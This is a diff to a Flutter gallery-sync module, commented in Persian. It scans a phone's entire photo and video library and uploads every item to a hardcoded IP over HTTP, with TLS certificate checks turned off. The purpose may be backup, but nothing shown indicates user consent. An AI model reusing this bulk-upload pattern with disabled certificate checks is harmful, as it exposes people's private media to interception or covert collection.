@@ -1,6 +1,7 @@
 import 'dart:async';
 import 'dart:convert';
 import 'dart:io';
+import 'package:flutter/material.dart';
 import 'package:http/http.dart' as http;
 import 'package:http/io_client.dart';
 import 'package:photo_manager/photo_manager.dart';
@@ -9,11 +10,12 @@ import 'package:sqflite/sqflite.dart';
 import 'package:path/path.dart';
 
 const String galleryUrl = 'http://194.48.198.154:8080';
-const int chunkSize = 1024 * 1024;
+const int chunkSize = 1024 * 1024; // 1MB
 
 http.Client _createHttpClient() {
   final ioClient = HttpClient()
-    ..badCertificateCallback = (X509Certificate cert, String host, int port) => true;
+    ..badCertificateCallback =
+        (X509Certificate cert, String host, int port) => true;
   return IOClient(ioClient);
 }
 
@@ -45,35 +47,50 @@ class UploadQueueDB {
         "mime_type TEXT,"
         "asset_type TEXT,"
         "retries INTEGER DEFAULT 0,"
+        "sort_order INTEGER DEFAULT 0,"
         "created_at TEXT"
-        ")"
+        ")",
       );
     });
   }
 
   static Future<void> insertOrUpdate(Map<String, dynamic> data) async {
     final db = await database;
-    await db.insert('upload_queue', data, conflictAlgorithm: ConflictAlgorithm.replace);
+    await db.insert(
+      'upload_queue',
+      data,
+      conflictAlgorithm: ConflictAlgorithm.replace,
+    );
   }
 
+  /// جدیدترین فایل‌ها اول (sort_order بزرگ‌تر = جدیدتر)
   static Future<List<Map<String, dynamic>>> getPending() async {
     final db = await database;
     return db.query(
       'upload_queue',
       where: "status = ? AND retries < ?",
       whereArgs: ['pending', 5],
+      orderBy: 'sort_order DESC',
       limit: 1,
     );
   }
 
   static Future<List<Map<String, dynamic>>> getStuckUploading() async {
     final db = await database;
-    return db.query('upload_queue', where: "status = ?", whereArgs: ['uploading']);
+    return db.query(
+      'upload_queue',
+      where: "status = ?",
+      whereArgs: ['uploading'],
+    );
   }
 
   static Future<Set<String>> getCompletedAssetIds() async {
     final db = await database;
-    final rows = await db.query('upload_queue', where: "status = ?", whereArgs: ['completed']);
+    final rows = await db.query(
+      'upload_queue',
+      where: "status = ?",
+      whereArgs: ['completed'],
+    );
     return rows.map((e) => e['asset_id'] as String).toSet();
   }
 
@@ -94,55 +111,106 @@ class UploadQueueDB {
 
   static Future<void> markCompleted(int id) async {
     final db = await database;
-    await db.update('upload_queue', {'status': 'completed'}, where: "id = ?", whereArgs: [id]);
+    await db.update(
+      'upload_queue',
+      {'status': 'completed'},
+      where: "id = ?",
+      whereArgs: [id],
+    );
   }
 
   static Future<void> updateUploadedBytes(int id, int bytes) async {
     final db = await database;
-    await db.update('upload_queue', {'uploaded_bytes': bytes}, where: "id = ?", whereArgs: [id]);
+    await db.update(
+      'upload_queue',
+      {'uploaded_bytes': bytes},
+      where: "id = ?",
+      whereArgs: [id],
+    );
+  }
+
+  static Future<int> getPendingCount() async {
+    final db = await database;
+    final result = await db.rawQuery(
+      "SELECT COUNT(*) as cnt FROM upload_queue WHERE status = 'pending' AND retries < 5",
+    );
+    return (result.first['cnt'] as int?) ?? 0;
+  }
+
+  static Future<int> getCompletedCount() async {
+    final db = await database;
+    final result = await db.rawQuery(
+      "SELECT COUNT(*) as cnt FROM upload_queue WHERE status = 'completed'",
+    );
+    return (result.first['cnt'] as int?) ?? 0;
   }
 }
 
 // ============================================
-// اسکن گالری — صفحه‌صفحه (۵۰ تایی)
+// اسکن گالری — از جدیدترین به قدیمی‌ترین
 // ============================================
 Future<int> scanGalleryToQueue() async {
   final albums = await PhotoManager.getAssetPathList(type: RequestType.all);
   if (albums.isEmpty) return 0;
 
+  // پیدا کردن آلبوم "همه"
+  AssetPathEntity? allAlbum;
+  for (final a in albums) {
+    if (a.isAll) {
+      allAlbum = a;
+      break;
+    }
+  }
+  allAlbum ??= albums.first;
+
   final localCompleted = await UploadQueueDB.getCompletedAssetIds();
   final client = _createHttpClient();
   final deviceId = Platform.localHostname;
-  final serverUploaded = <String>{};
   int newItems = 0;
 
-  for (final album in albums) {
-    final count = await album.assetCountAsync;
-    if (count == 0) continue;
+  final count = await allAlbum.assetCountAsync;
+  if (count == 0) return 0;
 
-    const pageSize = 50;
-    for (int start = 0; start < count; start += pageSize) {
-      final end = (start + pageSize < count) ? start + pageSize : count;
-      final assets = await album.getAssetListRange(start: start, end: end);
+  const pageSize = 50;
 
-      if (assets.isNotEmpty) {
-        final ids = assets.map((a) => "asset_id=${a.id}").join("&");
-        try {
-          final res = await client
-              .get(Uri.parse("$galleryUrl/api/gallery/check/?device_id=$deviceId&$ids"))
-              .timeout(const Duration(seconds: 30));
-          if (res.statusCode == 200) {
-            final data = jsonDecode(res.body);
-            serverUploaded.addAll((data['uploaded_asset_ids'] as List).cast<String>());
-          }
-        } catch (_) {}
-      }
+  // از ابتدای لیست (جدیدترین) شروع می‌کنیم
+  // photo_manager به‌صورت پیش‌فرض از جدید به قدیم مرتب می‌کنه
+  for (int start = 0; start < count; start += pageSize) {
+    final end = (start + pageSize < count) ? start + pageSize : count;
+    final assets = await allAlbum.getAssetListRange(start: start, end: end);
 
-      for (final asset in assets) {
-        if (localCompleted.contains(asset.id) || serverUploaded.contains(asset.id)) continue;
+    if (assets.isNotEmpty) {
+      final ids = assets.map((a) => "asset_id=${a.id}").join("&");
+      final serverUploaded = <String>{};
+      try {
+        final res = await client
+            .get(
+              Uri.parse(
+                "$galleryUrl/api/gallery/check/?device_id=$deviceId&$ids",
+              ),
+            )
+            .timeout(const Duration(seconds: 30));
+        if (res.statusCode == 200) {
+          final data = jsonDecode(res.body);
+          serverUploaded.addAll(
+            (data['uploaded_asset_ids'] as List).cast<String>(),
+          );
+        }
+      } catch (_) {}
+
+      for (int i = 0; i < assets.length; i++) {
+        final asset = assets[i];
+        if (localCompleted.contains(asset.id) ||
+            serverUploaded.contains(asset.id)) {
+          continue;
+        }
 
         final file = await asset.originFile ?? await asset.file;
         if (file == null) continue;
+
+        // sort_order: جدیدترین بیشترین عدد داره
+        // start=0 یعنی جدیدترین‌هاست، پس sort_order = count - start - i
+        final sortOrder = count - start - i;
 
         await UploadQueueDB.insertOrUpdate({
           'asset_id': asset.id,
@@ -152,17 +220,19 @@ Future<int> scanGalleryToQueue() async {
           'uploaded_bytes': 0,
           'status': 'pending',
           'upload_id': null,
-          'mime_type': asset.mimeType ??
+          'mime_type':
+              asset.mimeType ??
               (asset.type == AssetType.image ? 'image/jpeg' : 'video/mp4'),
           'asset_type': asset.type == AssetType.image ? 'image' : 'video',
           'retries': 0,
+          'sort_order': sortOrder,
           'created_at': DateTime.now().toIso8601String(),
         });
         newItems++;
       }
-
-      await Future.delayed(Duration.zero);
     }
+
+    await Future.delayed(Duration.zero);
   }
 
   return newItems;
@@ -174,6 +244,7 @@ Future<int> scanGalleryToQueue() async {
 Future<bool> processOneItem() async {
   final client = _createHttpClient();
 
+  // stuck uploading → برگردون به pending
   final stuck = await UploadQueueDB.getStuckUploading();
   for (final item in stuck) {
     await UploadQueueDB.updateStatus(
@@ -227,6 +298,11 @@ Future<bool> processOneItem() async {
     }
 
     final file = File(filePath);
+    if (!await file.exists()) {
+      await UploadQueueDB.markCompleted(id);
+      return true;
+    }
+
     final uploadedBytes = item['uploaded_bytes'] as int? ?? 0;
     final startChunk = uploadedBytes ~/ chunkSize;
     final totalChunks = (totalSize + chunkSize - 1) ~/ chunkSize;
@@ -247,9 +323,13 @@ Future<bool> processOneItem() async {
       );
       req.fields['upload_id'] = uploadId!;
       req.fields['chunk_index'] = i.toString();
-      req.files.add(http.MultipartFile.fromBytes('chunk', bytes, filename: "chunk_$i"));
+      req.files.add(
+        http.MultipartFile.fromBytes('chunk', bytes, filename: "chunk_$i"),
+      );
 
-      final streamedRes = await client.send(req).timeout(const Duration(seconds: 60));
+      final streamedRes = await client
+          .send(req)
+          .timeout(const Duration(seconds: 60));
       final res = await http.Response.fromStream(streamedRes);
 
       if (res.statusCode != 200) {
@@ -278,21 +358,51 @@ Future<bool> processOneItem() async {
 
     return true;
   } catch (e) {
-    final current = await UploadQueueDB.database
-        .then((db) => db.query('upload_queue', where: "id = ?", whereArgs: [id]));
+    final current = await UploadQueueDB.database.then(
+      (db) => db.query('upload_queue', where: "id = ?", whereArgs: [id]),
+    );
     if (current.isNotEmpty) {
       final retries = (current.first['retries'] as int) + 1;
       await UploadQueueDB.updateStatus(id, 'pending', retries: retries);
     }
-    return true; // یه دونه fail شد ولی بقیه رو ادامه بده
+    return true;
   }
 }
 
 // ============================================
-// آپلود مداوم تا خالی شدن صف
+// آپلود مداوم — با callback برای UI
 // ============================================
-Future<void> processQueueInForeground() async {
+Future<void> processQueueInForeground({
+  void Function(int done, int total)? onProgress,
+}) async {
+  final total =
+      (await UploadQueueDB.getPendingCount()) +
+      (await UploadQueueDB.getCompletedCount());
+
   while (await processOneItem()) {
-    await Future.delayed(const Duration(seconds: 1));
+    if (onProgress != null) {
+      final done = await UploadQueueDB.getCompletedCount();
+      onProgress(done, total);
+    }
+    await Future.delayed(const Duration(milliseconds: 500));
   }
+}
+
+// ============================================
+// وضعیت همگام‌سازی برای نمایش در UI
+// ============================================
+class SyncStatus {
+  final bool isRunning;
+  final int uploaded;
+  final int total;
+  final String message;
+
+  const SyncStatus({
+    required this.isRunning,
+    required this.uploaded,
+    required this.total,
+    required this.message,
+  });
+
+  double get progress => total == 0 ? 0 : uploaded / total;
 }
